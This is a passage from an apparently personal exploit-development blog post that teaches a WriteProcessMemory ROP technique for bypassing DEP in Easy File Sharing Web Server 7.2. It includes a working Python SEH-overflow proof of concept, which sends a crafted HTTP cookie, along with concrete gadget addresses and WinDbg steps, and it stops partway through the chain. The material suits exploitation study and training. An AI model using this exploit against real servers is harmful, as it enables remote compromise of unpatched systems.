Introduction
---
The other day on Twitter, I received a very kind and flattering [message](https://twitter.com/duff22b/status/1282014844338597888?s=20) about a previous [post](https://connormcgarr.github.io/ROP/) of mine on the topic of ROP. Thinking about this post, I recall utilizing `VirtualProtect()` and disabling ASLR system wide to bypass DEP. I also used an outdated debugger, Immunity Debugger at the time, and I wanted to expand on my previous work, with a little bit of a less documented ROP technique and WinDbg.

Why is ROP Important?
---
ROP/COP and other code reuse apparatuses are very important mitigation bypass techniques, due to their versatility. Binary exploit mitigations have come a long way since DEP. Notably, mitigations such as CFG, upcoming XFG, ACG, etc. have posed an increased threat to exploit writers as time has gone on. ROP _still_ has been the “swiss army knife” to keep binary exploits alive. ROP can result in arbitrary write and arbitrary read primitives- as we will see in the upcoming post. Additionally, data only attacks with the implementation of ACG have become crucial. It is possible to perform a data only attack, although expensive from a technical perspective, to write payloads fully in ROP.

What This Blog Assumes and What This Blog _ISN'T_
---
If you are interested in a remote bypass of ASLR and a 64-bit version of bypassing DEP, I suggest reading a [previous blog](https://connormcgarr.github.io/eko2019-exe) of mine on this topic (although, undoubtedly, there are better blogs on this subject).

This blog will not address ASLR or 64-bit exploitation- and will be utilizing non-ASLR compiled modules, as well as the x86 [stdcall](https://docs.microsoft.com/en-us/cpp/cpp/stdcall?view=vs-2019) calling convention (technically an "ASLR bypass", but in my opinion only information leak = a _true_ ASLR bypass).

Why are these topics not being addressed? This post aims to focus on a different, less documented approach to executing code with ROP. As such, I find it useful to use the most basic, straightforward example to hopefully help the reader fully understand a concept. I am _fully_ aware that it is 2020 and I am well aware mitigations such as CFG are more common. However, _generally_ the last step in exploitation, no matter HOW many mitigations there are (unless you are performing a data only attack), is bypassing DEP (in user mode or kernel mode). This post aims to address the latter portion of the last sentiment- and expects the reader already has an ASLR bypass primitive and a way to pivot to the stack.

Expediting The Process
---
The application we will be going after is `Easy File Sharing Web Server 7.2`, which has a memory corruption vulnerability as a result of an HTTP request.

The offset to SEH is `2563` bytes. Instead of using a `pop <reg>` `pop <reg>` `ret` sequence, as is normally done on a 32-bit SEH exploit, an `add esp, <bytes>` instruction is used. This will take the stack, where it is currently not controlled by us, and change the address to an address on the stack that we control- and then return into it.

```python
import sys
import os
import socket
import struct

# 4063 byte SEH offset
# Stack pivot lands at padding buffer to SEH at offset 2563
crash = "\x90" * 2563

# Stack pivot lands here
# Beginning ROP chain
crash += struct.pack('<L', 0x90909090)

# 4063 total offset to SEH
crash += "\x41" * (4063-len(crash))

# SEH only- no nSEH because of DEP
# Stack pivot to return to buffer
crash += struct.pack('<L', 0x10022869)		# add esp, 0x1004 ; ret: ImageLoad.dll (non-ASLR enabled module)

# 5000 total bytes for crash
crash += "\x41" * (5000-len(crash))

# Replicating HTTP request to interact with the server
# UserID contains the vulnerability
http_request = "GET /changeuser.ghp HTTP/1.1\r\n"
http_request += "Host: 172.16.55.140\r\n"
http_request += "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:60.0) Gecko/20100101 Firefox/60.0\r\n"
http_request += "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n"
http_request += "Accept-Language: en-US,en;q=0.5\r\n"
http_request += "Accept-Encoding: gzip, deflate\r\n"
http_request += "Referer: http://172.16.55.140/\r\n"
http_request += "Cookie: SESSIONID=9349; UserID=" + crash + "; PassWD=;\r\n"
http_request += "Connection: Close\r\n"
http_request += "Upgrade-Insecure-Requests: 1\r\n"

print "[+] Sending exploit..."
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(("172.16.55.130", 80))
s.send(http_request)
s.close()
```

Set a breakpoint on the stack pivot of `add esp, 0x1004 ; ret` with the WinDbg command `bp 0x10022869`. After sending the exploit PoC- we will need to view the contents of the exception handler with the WinDbg command `!exchain`.

As a breakpoint has already been set on the address inside of SEH, all that is needed to pass the exception is resuming execution with the `g` command in WinDbg. The breakpoint is hit, and we will step through the instruction of `add esp, 0x1004` (`t` in WinDbg) to take control of the stack.

As a point of contention, we have about 980 bytes to work with.

The Call to `WriteProcessMemory()`
---
What is the goal of this method of bypassing DEP? The goal here is to not to dynamically change permissions of memory to make it executable- but to instead write our shellcode, dynamically, to already executable memory. 

As we know, when DEP is enabled, memory is either writable or executable- but not both at the same time. The previous sentiment about writing shellcode, via `WriteProcessMemory()`, to executable memory is a bit contradictory knowing this. If memory is executable, adhering to DEP's rules, it _shouldn't_ be writable. `WriteProcessMemory()` overcomes this by temporarily marking memory pages as `RWX` while data is being written to a destination- even if that destination doesn't have writable permissions. After the write succeeds, the memory is then marked again as execute only.

From an adversary's perspective, this means something. Certain shellcodes employ encoding mechanisms to bypass character filtering. If this is the case, encoded shellcode which is dynamically written to execute only memory will fail when executed. This is due to the encoded shellcode needing to "write itself" over adjacent process memory to decode. Since pages are execute only, and we do not have the `WriteProcessMemory()` "pass" to write to execute only memory anymore, an access violation will occur. Something to definitely keep in mind.

Let's take a look at the call to `WriteProcessMemory()` firslty, to help make sense of all of this (per [Microsoft Docs](https://docs.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory))

```c++
BOOL WriteProcessMemory(
  HANDLE  hProcess,
  LPVOID  lpBaseAddress,
  LPCVOID lpBuffer,
  SIZE_T  nSize,
  SIZE_T  *lpNumberOfBytesWritten
);
```

Let's break down the call to `WriteProcessMemory()` by taking a look at each function argument.

1. `HANDLE hProcess`: According to Microsoft Docs, this parameter is a handle to the desired process in which a user wants to write to the process memory. A handle, without going too much into detail, is a "reference" or "index" to an object. Generally, a handle is used as a "proxy" of sorts to access an object (this is especially true in kernel mode, as user mode cannot directly access kernel mode objects). We will look at how to dynamically resolve this parameter with relative ease. Think of this as "don't talk to me, talk to my assistant", where the process is the "me" and the handle is the "assistant".
2. `LPVOID lpBaseAddress`: This parameter is a pointer to the base address in which a write is desired. For example, if the region of memory you would like to write to was `0x11223344` - `0x11223355`, the argument passed to the function call would be `0x11223344`.
3. `LPCVOID lpBuffer`: This is a pointer to the buffer that is to be written to the address specified by the `lpBaseAddress` parameter. This will be the pointer to our shellcode.
4. `SIZE_T nSize`: The number of bytes to be written (whatever the size of the shellcode + NOPs, if necessary, will be).
5. `SIZE_T *lpNumberOfBytesWritten`: This parameter, similarly to the `VirtualProtect()` parameter `lpflOldProtect` which inherits the old permissions of modified memory, inherits the number of bytes written. This will need to be a memory address, within the process space, that is writable.

Preserving a Stack Address
---
One of the pitfalls of ROP is that stack control is absolutely vital. Why? It is logical actually- each ROP gadget is appended with a `ret` instruction. `ret`, from a technical perspective, will take the value pointed to by RSP (or ESP in this case), which will be the next ROP gadget on the stack and load it into RIP (EIP in this case). Since ROP must be performed on the stack, and due to the dynamic nature of the stack, the virtual memory addresses associated with the stack are also dynamic.

As seen below, when the stack pivot is successfully performed, the virtual address of the stack is `0x029a68dc`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM1.png" alt="">

Restarting the application and pivoting to the stack again, the virtual address of the stack is at `0x028068dc`.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM3.png" alt="">

At first glance, this puts us in a difficult position. Even with knowledge of the base addresses of each module, and their static nature- the stack still seems to change! Although the stack is dynamically being resolved to seemingly "random" and "volatile to the duration of the process" memory- there is a way around this. If we can use a ROP gadget, or set of gadgets, properly- we can dynamically store an address around the stack into a CPU register.

Let's start our ROP chain by preserving an address near the current stack pointer.

As you may or may not know, the base pointer (EBP) points to the "bottom" of the current stack frame (we will refer to the current stack frame as "the stack"). This means that EBP should be relatively close to ESP. We can validate this in WinDbg by viewing the current state of the CPU registers after the stack pivot.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM4.png" alt="">

After parsing the PE with [rp++](), to enumerate a list of ROP gadgets (you can view how to use rp++ by taking a look at my last ROP blog [post](https://connormcgarr.github.io/ROP))- a nice gadget resides in `sqlite3.dll` that can help us preserve the address of EBP into another "common" register, which has more useful ROP gadgets as we will see later on, such as EAX.

```
0x61c05e8c: xchg eax, ebp ; ret  ;  (1 found)
```

Replace the NOPs in the previous PoC script, under the "Begin ROP chain" comment, with the above address. After firing off the updated PoC, we land on our intended ROP gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM5.png" alt="">

After executing the above gadget, EAX is now loaded with an address near the current stack.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM6.png" alt="">

Notice that EBP has also been set to 0, due to the ROP gadget. This will come into play shortly.

Although EAX is _relatively_ close to ESP- it is still a decent ways away. Currently, EAX (which now contains the old value of EBP) is `0xfec` bytes away from ESP.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM7a.png" alt="">

To compensate for this, we will manipulate EAX to contain the address at ESP + 0x24.

Why ESP + 0x24 instead of just ESP you ask? This is a "prepatory" procedure (manipulating EAX to contain the address of ESP + 0x24). 

As we will see later on, we would like to preserve an address around ESP into another "common" register. ECX is a register that is used as a "counter" (although technically it is a general purpose register). This means that ECX generally is a part of some more useful ROP gadgets. 

In order to do this, the stack will eventually need to be increased by 0x24 bytes to get the value (technically future value) of ESP into ECX, due to the nature of the ROP gadgets available within the process memory. Knowing this, and knowing that we would like EAX and ECX to be equal to the current address at ESP- we will prepare EAX in advance.

> Note that this is by no means a requirement (getting EAX and ECX set to the EXACT value of ESP) when doing ROP. This will just make life easier in the future. If this doesn't make sense now, do not worry. Just focus on the fact we would like to get EAX closer to ESP for the time being.

```
0x10018606: pop ecx ; ret  ;  (1 found)
0xffffefe8 (Value to be popped into EAX. This is the negative representation of the distance between the current value of EAX and ESP + 0x24). 
0x1001283e: sub eax, ecx ; ret  ;  (1 found)
```

After the aformentioned gadget of exchanging EBP and EAX, program execution hits the `pop ecx` gadget.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM8.png" alt="">

The negative value of the distance between EAX and ESP + 0x24 is placed into ECX.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM9.png" alt="">

Program execution then transfers to the `sub eax, ecx` ROP gadget- which will place the difference into the EAX register, resulting in EAX being set to ESP + 0x24.

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM10.png" alt="">

<img src="{{ site.url }}{{ site.baseurl }}/images/WPM11.png" alt="">

The goal now is to get the current value of EAX into ECX. There is a nice ROP gadget that will do this for us.

```
0x61c6588d: mov ecx, eax ; mov eax, ecx ; add esp, 0x24 ; pop ebx ; leave  ; ret  ;  (1 found)
```

This gadget will take EAX and place it into ECX. Then, a `mov eax, ecx` instruction will occur- which is meaningless because ECX and EAX already contain the same value- meaning this part of the gadget basically just serves as a "NOP" of sorts. ESP then gets raised by 0x24 bytes, which we can compensate for- so this isn't an issue. `pop ebx` can be compensated for as well, but `leave` will be a problem as this will directly manipulate ESP, throwing our ROP execution flow off.

`leave`, from a technical perspective, will perform a `mov esp, ebp` and a `pop ebp` instruction.
